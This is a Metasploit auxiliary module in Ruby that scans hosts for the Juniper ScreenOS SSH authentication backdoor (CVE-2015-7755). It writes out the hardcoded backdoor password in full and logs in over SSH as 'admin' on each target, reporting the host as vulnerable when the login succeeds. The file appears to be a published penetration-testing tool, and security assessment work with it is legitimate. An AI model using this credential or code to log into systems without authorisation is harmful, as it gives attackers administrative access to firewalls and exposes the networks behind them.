##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'net/ssh'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::SSH

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Juniper SSH Backdoor Scanner',
      'Description'    => %q{
        This module scans for the Juniper SSH backdoor (also valid on Telnet).
        Any username is required, and the password is <<< %s(un='%s') = %u.
      },
      'Author'         => [
        'hdm',                               # Discovery
        'h00die <mike[at]stcyrsecurity.com>' # Module
      ],
      'References'     => [
        ['CVE', '2015-7755'],
        ['URL', 'https://blog.rapid7.com/2015/12/20/cve-2015-7755-juniper-screenos-authentication-backdoor'],
        ['URL', 'https://kb.juniper.net/InfoCenter/index?page=content&id=JSA10713']
      ],
      'DisclosureDate' => 'Dec 20 2015',
      'License'        => MSF_LICENSE
    ))

    register_options([
      Opt::RPORT(22)
    ])

    register_advanced_options([
      OptBool.new('SSH_DEBUG',  [false, 'SSH debugging', false]),
      OptInt.new('SSH_TIMEOUT', [false, 'SSH timeout', 10])
    ])
  end

  def run_host(ip)
    factory = ssh_socket_factory
    ssh_opts = {
      :port            => rport,
      :auth_methods    => ['password', 'keyboard-interactive'],
      :password        => %q{<<< %s(un='%s') = %u},
      :proxy           => factory,
      :non_interactive => true,
      :verify_host_key => :never
    }

    ssh_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']

    begin
      ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do
        Net::SSH.start(
          ip,
          'admin',
          ssh_opts
        )
      end
    rescue Net::SSH::Exception => e
      vprint_error("#{ip}:#{rport} - #{e.class}: #{e.message}")
      return
    end

    if ssh
      print_good("#{ip}:#{rport} - Logged in with backdoor account admin:<<< %s(un='%s') = %u")
      report_vuln(
        :host => ip,
        :name => self.name,
        :refs => self.references,
        :info => ssh.transport.server_version.version
      )
    end
  end

  def rport
    datastore['RPORT']
  end
end
